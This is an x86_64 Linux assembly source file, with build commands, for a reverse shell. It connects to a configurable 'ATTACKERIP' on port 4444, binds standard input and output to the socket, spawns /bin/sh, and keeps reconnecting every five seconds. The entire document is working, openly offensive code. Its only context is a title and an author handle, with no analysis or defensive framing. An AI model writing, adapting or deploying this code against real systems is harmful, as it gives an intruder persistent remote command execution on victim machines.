; ASSEMBLY REVERSE SHELL SCRIPT
; AUTHOR: MatrixTM26
; TARGET: LINUX x86_64 (ELF64 BIT)
; compile:
;     nasm -f elf64 shell.asm -o shell_asm_out.o
;     gcc shell_asm_out.o -o shell_asm -no-pie -lc

section .data
    ATTACKERIP db "127.0.0.1", 0
    ATTACKERPORT dw 4444
    binsh db "/bin/sh", 0
    shstr db "sh", 0
    msg_down db "[!] server seems down. reconnecting...", 10, 0
    msg_down_len equ $ - msg_down
    msg_connected db "[+] connected to 127.0.0.1:25000", 10, 0
    msg_conn_len equ $ - msg_connected

section .bss
    addr resb 16
    s resd 1
    pid resd 1
    status resd 1

section .text
    global _start

    extern socket
    extern connect
    extern close
    extern dup2
    extern execl
    extern fork
    extern waitpid
    extern write
    extern usleep
    extern htons
    extern inet_addr

_start:
.loop:
    mov edi, 2
    mov esi, 1
    xor edx, edx
    xor eax, eax
    call socket
    test eax, eax
    js .server_down
    mov [s], eax

    mov word [addr], 2

    movzx edi, word [ATTACKERPORT]
    xor eax, eax
    call htons
    mov word [addr+2], ax

    lea rdi, [ATTACKERIP]
    xor eax, eax
    call inet_addr
    mov dword [addr+4], eax

    mov qword [addr+8], 0

    mov edi, [s]
    lea rsi, [addr]
    mov edx, 16
    xor eax, eax
    call connect
    test eax, eax
    js .close_and_reconnect

    mov edi, 1
    lea rsi, [msg_connected]
    mov edx, msg_conn_len - 1
    xor eax, eax
    call write

    xor eax, eax
    call fork
    mov [pid], eax
    test eax, eax
    jz .child_process
    js .close_and_reconnect
    jmp .parent_process

.child_process:
    mov edi, [s]
    xor esi, esi
    xor eax, eax
    call dup2

    mov edi, [s]
    mov esi, 1
    xor eax, eax
    call dup2

    mov edi, [s]
    mov esi, 2
    xor eax, eax
    call dup2

    lea rdi, [binsh]
    lea rsi, [shstr]
    xor rdx, rdx
    xor eax, eax
    call execl

    mov eax, 60
    mov edi, 1
    syscall

.parent_process:
    mov edi, [pid]
    lea rsi, [status]
    xor edx, edx
    xor eax, eax
    call waitpid

    mov edi, [s]
    xor eax, eax
    call close

    jmp .reconnect_msg

.close_and_reconnect:
    mov edi, [s]
    xor eax, eax
    call close

.server_down:
.reconnect_msg:
    mov edi, 1
    lea rsi, [msg_down]
    mov edx, msg_down_len - 1
    xor eax, eax
    call write

    mov edi, 5000000
    xor eax, eax
    call usleep

    jmp .loop